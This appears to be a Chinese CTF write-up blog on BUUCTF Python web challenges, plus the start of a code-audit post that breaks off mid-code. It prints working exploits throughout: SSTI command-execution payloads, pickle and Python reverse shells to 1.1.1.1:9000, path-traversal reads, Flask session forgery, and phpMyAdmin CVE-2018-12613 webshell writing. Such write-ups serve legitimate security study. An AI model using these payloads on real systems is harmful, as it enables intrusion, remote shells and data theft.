登陆admin即可得到flag routes.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495@app.route(&#x27;/code&#x27;)def get_code(): image, code = get_verify_code() # 图片以二进制形式写入 buf = BytesIO() image.save(buf, &#x27;jpeg&#x27;) buf_str = buf.getvalue() # 把buf_str作为response返回前端，并设置首部字段 response = make_response(buf_str) response.headers[&#x27;Content-Type&#x27;] = &#x27;image/gif&#x27; # 将验证码字符串储存在session中 session[&#x27;image&#x27;] = code return response@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)def index(): return render_template(&#x27;index.html&#x27;, title = &#x27;hctf&#x27;)@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def register(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = RegisterForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) if session.get(&#x27;image&#x27;).lower() != form.verify_code.data.lower(): flash(&#x27;Wrong verify code.&#x27;) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form=form) if User.query.filter_by(username = name).first(): flash(&#x27;The username has been registered&#x27;) return redirect(url_for(&#x27;register&#x27;)) user = User(username=name) user.set_password(form.password.data) db.session.add(user) db.session.commit() flash(&#x27;register successful&#x27;) return redirect(url_for(&#x27;login&#x27;)) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form = form)@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def login(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = LoginForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) session[&#x27;name&#x27;] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash(&#x27;Invalid username or password&#x27;) return redirect(url_for(&#x27;login&#x27;)) login_user(user, remember=form.remember_me.data) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;login.html&#x27;, title = &#x27;login&#x27;, form = form)@app.route(&#x27;/logout&#x27;)def logout(): logout_user() return redirect(&#x27;/index&#x27;)@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def change(): if not current_user.is_authenticated: return redirect(url_for(&#x27;login&#x27;)) form = NewpasswordForm() if request.method == &#x27;POST&#x27;: name = strlower(session[&#x27;name&#x27;]) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash(&#x27;change successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form)@app.route(&#x27;/edit&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def edit(): if request.method == &#x27;POST&#x27;: flash(&#x27;post successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;edit.html&#x27;, title = &#x27;edit&#x27;)@app.errorhandler(404)def page_not_found(error): title = unicode(error) message = error.description return render_template(&#x27;errors.html&#x27;, title=title, message=message)def strlower(username): username = nodeprep.prepare(username) return username 在config.py看到secret_key,可以考虑session伪造 1234class Config(object): SECRET_KEY = os.environ.get(&#x27;SECRET_KEY&#x27;) or &#x27;ckj123&#x27; SQLALCHEMY_DATABASE_URI = &#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27; SQLALCHEMY_TRACK_MODIFICATIONS = True flask session加密解密工具github地址：https://github.com/noraj/flask-session-cookie-manager 1234python flask_session_manager.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEYpython flask_session_manager.py encode -s -t # -s参数是SECRET_KEY -t参数session解密后的格式 替换就可以得到flag，其实可以不用这么长的session，直接下面这样也行 1python flask_session_cookie_manager2.py encode -s ckj123 -t &quot;&#123;u&#x27;user_id&#x27;: u&#x27;10&#x27;, u&#x27;name&#x27;: u&#x27;admin&#x27;&#125;&quot; 这题还可以用unicode欺骗，不难发现登陆注册页面对session[&#39;name&#39;]的操作都进行了strlower函数的操作,而strlower又如下调用了 12345from twisted.words.protocols.jabber.xmpp_stringprep import nodeprepdef strlower(username): username = nodeprep.prepare(username) return username 在requirements.txt看到twisted的版本是10.2.0，目前版本都20.3.0了，刚好该版本存在漏洞 nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a 所以我们注册ᴬdmin此时调用一次变成Admin，再修改一次密码就能再调用一次变成admin,此时修改的就是admin的密码，这种方法也能getflag 这题还能用条件竞争的方法 12345678910111213def login(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = LoginForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) session[&#x27;name&#x27;] = namedef change(): if not current_user.is_authenticated: return redirect(url_for(&#x27;login&#x27;)) form = NewpasswordForm() if request.method == &#x27;POST&#x27;: name = strlower(session[&#x27;name&#x27;]) 可以看到这登陆和改密码操作在没有完全check身份的情况下，执行了session有关的赋值 因此我们可以用条件竞争的方法，一个改密码，一个退出登陆并以admin登陆，exp: 1234567891011121314151617181920212223242526272829303132333435import requestsimport threadingdef login(s, username, password): data = &#123; &#x27;username&#x27;: username, &#x27;password&#x27;: password, &#x27;submit&#x27;: &#x27;&#x27; &#125; return s.post(&quot;http://admin.2018.hctf.io/login&quot;, data=data)def logout(s): return s.get(&quot;http://admin.2018.hctf.io/logout&quot;)def change(s, newpassword): data = &#123; &#x27;newpassword&#x27;:newpassword &#125; return s.post(&quot;http://admin.2018.hctf.io/change&quot;, data=data)def func1(s): login(s, &#x27;skysec&#x27;, &#x27;skysec&#x27;) change(s, &#x27;skysec&#x27;)def func2(s): logout(s) res = login(s, &#x27;admin&#x27;, &#x27;skysec&#x27;) if &#x27;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#x27; in res.text: print(&#x27;finish&#x27;)def main(): for i in range(1000): print(i) s = requests.Session() t1 = threading.Thread(target=func1, args=(s,)) t2 = threading.Thread(target=func2, args=(s,)) t1.start() t2.start()if __name__ == &quot;__main__&quot;: main() [De1CTF 2019]SSRF Mewriteup打开发现有源码,整理下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#! /usr/bin/env python #encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import jsonreload(sys) sys.setdefaultencoding(&#x27;latin1&#x27;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#x27;code&#x27;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#x27;data&#x27;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan. @app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) @app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;]) def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(&#x27;/&#x27;) def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False if __name__ == &#x27;__main__&#x27;: app.debug = False app.run(host=&#x27;0.0.0.0&#x27;,port=80) 看下大概代码 有两个路由 /geneSign： 可以获得 1hashlib.md5(secert_key + param + action).hexdigest() /De1ta: 主要代码都在这里 先看下 123456789101112131415161718192021 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#x27;data&#x27;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result 如果self.action为readscan 那么就可以获得scan的结果 123456789101112def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; waf函数限制了开头 不能是gopher和file 不用协议也行 直接文件名 即param设置为flag.txt 再看下认证部分 Task类里面的: 12345678 def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() # hashlib.md5(secert_key + &quot;flag.txtreadscan&quot;).hexdigest() /geneSign路由部分 12345678@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() 可以看到action是限定死的 但是我们可以设置param为flag.txtread action设置成scan 因此： [SUCTF 2019]Pythonginxwriteup查看源码 发现部分源码： 123456789101112131415161718192021222324@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return urllib.request.urlopen(finalUrl).read() else: return &quot;我扌 your problem? 333&quot; &lt;/code&gt; &lt;!-- Dont worry about the suctf.cc. Go on! --&gt; &lt;!-- Do you know the nginx? --&gt; 题目来源于BlackHat议题：https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf 在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。 fuzz脚本： 1234567891011121314151617181920212223242526272829303132333435from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode(): for x in range(0x110000): uni=chr(x) url=&quot;http://suctf.c&#123;&#125;&quot;.format(uni) try: if getUrl(url): print(&quot;str: &quot;+uni+&#x27; unicode: \\\\u&#x27;+str(hex(x))[2:]) except: pass def getUrl(url): url=url host=parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return False parts=list(urlsplit(url)) host=parts[1] if host == &#x27;suctf.cc&#x27;: return False newhost=[] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1]=&#x27;.&#x27;.join(newhost) finalUrl=urlunsplit(parts).split(&#x27; &#x27;)[0] host=parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return True else: return False if __name__==&#x27;__main__&#x27;: get_unicode() 任意文件读取： 1getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.cⒸ&#x2F;etc&#x2F;passwd nginx配置文件： 12345678配置文件存放目录：&#x2F;etc&#x2F;nginx主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 在nginx配置文件中找到flag的位置 1getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.cⒸ&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 这题还可以用CVE-2019-9636：https://bugs.python.org/issue36216 payload: 1getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd [WesternCTF2018]shrinewriteup源码： 1234567891011121314151617181920212223import flaskimport osapp = flask.Flask(__name__)app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)@app.route(&#x27;/&#x27;)def index(): return open(__file__).read()@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)def shrine(shrine): def safe_jinja(s): s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;) blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == &#x27;__main__&#x27;: app.run(debug=True) ssti flag在config里 只是过滤了config 还有其它方法获取config 12&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125; [护网杯 2018]easy_tornadowriteup打开题目发现三个文件，flag.txt提示flag在/fllllllllllllag，welcome.txt提示render，hints.txt提示md5(cookie_secret+md5(filename))，结合题目名字，联想到python中的tornado框架render模板注入 cookie_secret存放在handler.settings中，因此我们可以读取出cookie_secret，payload: 1error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125; 发现成功读取到cookie_secret，按照提示给的格式读取flag 1234&lt;?php$cookie_secret=&#x27;a33e0b4f-63b4-4ede-90b5-cc7bb45f48ca&#x27;;$filename=&#x27;/fllllllllllllag&#x27;;echo md5($cookie_secret.md5($filename)); 尝试访问，得到flag 1file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;8089e3218f80b4c12a208cc0e9974d98 [CSCCTF 2019 Qual]FlaskLightwriteup查看源码提示search参数 GET方式 1?search&#x3D;&#123;&#123;2*2&#125;&#125; 发现回显4 明显ssti 测了下p神的payload 500不行 列一下所有可用的类 1&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125; 这里直接贴下这位脚本：https://blog.csdn.net/SopRomeo/article/details/108985950 123456789101112import requestsimport htmlimport timefor i in range(0,300): time.sleep(0.5) url=&quot;http://4d0aed10-26a2-4108-8b17-9c8aa555ca2d.node3.buuoj.cn?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[%d]&#125;&#125;&quot;%(i) r = requests.get(url) print(url) if &quot;subprocess.Popen&quot; in html.unescape(r.text): print(i) break 用来计算subprocess.Popen的位置 第258位 然后用下面的payload就能命令执行了 1&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; 除此之外还可以使用 1&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125; [CISCN2019 华北赛区 Day1 Web2]ikunwriteup注册登陆 看到 访问/static/img/lv/lv6.png 存在 写个脚本跑下 12345678import requestsurl = &#x27;http://46cda335-76dc-4e06-a545-b8e90926388e.node3.buuoj.cn/shop?page=&#x27;for i in range(1,1000): r=requests.get(url+str(i)) if &quot;/static/img/lv/lv6.png&quot; in r.text: print(i) break 得到181 访问 购买 抓包 在结算时修改discount 访问Location位置 看到cookie里有jwt jwt crack破解一下密码 得到密码1Kun 修改jwt中的username 替换访问 得到源码：/static/asd1f654e683wq/www.zip 在Admin.py看到 pikle反序列化 从main.py print语句能看出为python2 没有过滤 直接__reduce__方法rce 12345678910import pickleimport urllibimport osclass test(object): def __reduce__(self): return (os.system,(&quot;sleep 3&quot;,))a=test()c=pickle.dumps(a)print(urllib.quote(c)) 发现可以延时 没有curl 有可能没bash 因此尝试使用python反弹shell 12345678910import pickleimport urllibimport osclass test(object): def __reduce__(self): return ((os.system,(&#x27;python -c \\&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;1.1.1.1&quot;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\\&#x27;&#x27;,))a = test()c = pickle.dumps(a)print(urllib.quote(c)) 或者直接读取文件 123456789import pickleimport urllibclass test(object): def __reduce__(self): return (eval,(&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))a = test()c = pickle.dumps(a)print(urllib.quote(c)) 注意是POST请求并且要带上_xsrf参数 [V&amp;N2020 公开赛]CHECKINwriteup123456789101112131415161718192021222324252627from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)# flag = flag_file.read()# flag_file.close()## @app.route(&#x27;/flag&#x27;)# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route(&#x27;/shell&#x27;)def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd = request.args.get(&#x27;c&#x27;) os.system(exec_cmd) return &quot;1&quot;@app.route(&#x27;/&#x27;)def source(): return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ == &quot;__main__&quot;: app.run(host=&#x27;0.0.0.0&#x27;) 访问/shell会删除flag文件 先反弹shell吧 1shell?c=python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;1.1.1.1&quot;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; 误删文件恢复可以参考：https://www.cnblogs.com/lxlinux/archive/2021/01/28/14341305.html Linux删除文件还原可以分为两种情况，一种是删除以后在进程存在删除信息，另外一种是删除以后进程都找不到，只有借助于工具还原 这里就属于第一种情况 直接查看目录 1&#x2F;proc&#x2F;PID&#x2F;fd&#x2F; 为了方便直接查看 1cat &#x2F;proc&#x2F;*&#x2F;fd&#x2F;* [网鼎杯 2020 白虎组]PicDownwriteup能传个url 测下发现是python的urllib库 直接目录穿越就能读flag 1page?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag 如果flag文件名是随机的就要尝试读源码 先读取cmdline 1page?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cmdline 读app.py 1page?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;app.py 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;search.html&#x27;)@app.route(&#x27;/page&#x27;)def page(): url = request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype=&#x27;application/octet-stream&#x27;) response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27; return response else: value = &quot;HACK ERROR!&quot; except: value = &quot;SOMETHING WRONG!&quot; return render_template(&#x27;search.html&#x27;, res=value)@app.route(&#x27;/no_one_know_the_manager&#x27;)def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return resif __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8080) 删除了secret.txt文件 从进程中读取 1page?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3 有key就能命令执行了 反弹shell查看flag [CISCN2019 华东南赛区]Double Secretwriteuprobots.txt 提示 貌似没啥用 首页提示Welcome To Find Secret 访问/secret 还真有 又提示 1Tell me your secret.I will encrypt it so others can&#39;t see 随便传一个secret python flask 开启debug 能看到部分代码 应该是ssti 接收参数通过rc4解密 用的这位师傅的脚本：https://ca01h.top/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python/#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret 12345678910111213141516171819202122232425262728293031import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;): # print(&quot;RC4加密主函数&quot;) s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) # print(&quot;原来的 s 盒：%s&quot; % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(&quot;混乱后的 s 盒：%s&quot;% s_box) return s_boxdef rc4_excrypt(plain, box): # print(&quot;调用加密程序成功。&quot;) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = &quot;&quot;.join(res) print(&quot;加密后的字符串是：%s&quot; %quote(cipher)) return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;) 直接CyberChef也行","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"buuctf刷题-代码审计篇","slug":"buuctf刷题-代码审计篇","date":"2020-01-12T12:16:57.000Z","updated":"2021-04-08T10:24:44.663Z","comments":true,"path":"2020/01/12/buuctf刷题-代码审计篇/","link":"","permalink":"http://www.moonback.xyz/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/","excerpt":"本篇博客主要介绍了buuctf web部分代码审计题目的wp！持续更新！","text":"本篇博客主要介绍了buuctf web部分代码审计题目的wp！持续更新！ [HCTF 2018]WarmUpwriteup打开题目，查看源代码发现source.php,得到源代码，代码审计 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 代码的大概意思是接受一个file的参数，限制变量类型为字符串，白名单检查通过检查就包含 这题的突破点就是url双重编码，从hint.php可知flag应该在/ffffllllaaaagggg，payload: 1?file=hint.php%25%33%66/../../../../ffffllllaaaagggg ?的url编码是%3f，双重编码是%25%33%66，在包含的时候会解析成hint.php%3f这个目录 这题的原型是phpmyadmin(CVE-2018-12613)后台任意文件包含漏洞 CVE-2018-12613复现漏洞简介此漏洞影响版本：4.8.0——4.8.1 漏洞的入口在index.php 54-63行 1234567891011121314$target_blacklist = array ( &#x27;import.php&#x27;, &#x27;export.php&#x27;);// If we have a valid target, let&#x27;s load that script insteadif (! empty($_REQUEST[&#x27;target&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;]) &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;]) &amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist) &amp;&amp; Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])) &#123; include $_REQUEST[&#x27;target&#x27;]; exit;&#125; 这里有5个条件，满足之后就会包含我们穿过来的文件。前4个条件都比较好理解，非空、必须为字符串、不能是index开头，不能是黑名单中的文件名（import.php、export.php)，重点看最后一个,Core类位于libraries/classes/Core.php 123456789101112131415161718192021222324252627282930public static function checkPageValidity(&amp;$page, array $whitelist = [])&#123; if (empty($whitelist)) &#123; $whitelist = self::$goto_whitelist; &#125; if (! isset($page) || !is_string($page)) &#123; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); //按?分割字符串，取前半部分 if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); //按?分割字符串，取前半部分 if (in_array($_page, $whitelist)) &#123; return true; &#125; return false;&#125; 基本上和题目代码一样，白名单有好多文件可以利用 这里是用的vulhub靶场，里面有这个漏洞的复现环境，直接docker搭建 构造payload类似于以下形式： 1index.php?target=db_sql.php%25%33%66/../../../../etc/passwd getshell方式1 包含session先执行条sql语句 1SELECT &#x27;&lt;?php phpinfo();?&gt;&#x27;; 查看session_id 包含，payload: 1?target=db_sql.php%253f/../../../../../tmp/sess_d3455e637bcc0b69789190c6ffb4cd18 个人在linux上搭建的环境好像不能直接执行有一句话的sql语句然后包含session来getshell 最好的方式还是找有写入权限的目录写马 1SELECT &quot;&lt;?php file_put_contents(&#x27;moonback.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);?&gt;&quot;; 方式2 包含数据库文件创建一个数据表，里面插入一句话 查询一下该表的路径 1show global variables like &#x27;%datadir%&#x27;; 然后直接包含就行，payload： 1index.php?target=db_sql.php%253f/../../../../../var/lib/mysql/test/shell.frm 在linux上尝试没包含成功，猜测可能是权限问题 [GWCTF 2019]枯燥的抽奖writeup我TM心态崩了啊，同一个session应该生成的随机数一样啊，试了好久，都快哭了 源码可以看到，访问check.php 12345678910111213141516171819202122232425262728 &lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#x27;seed&#x27;]))&#123;$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#x27;seed&#x27;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#x27;&#x27;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, 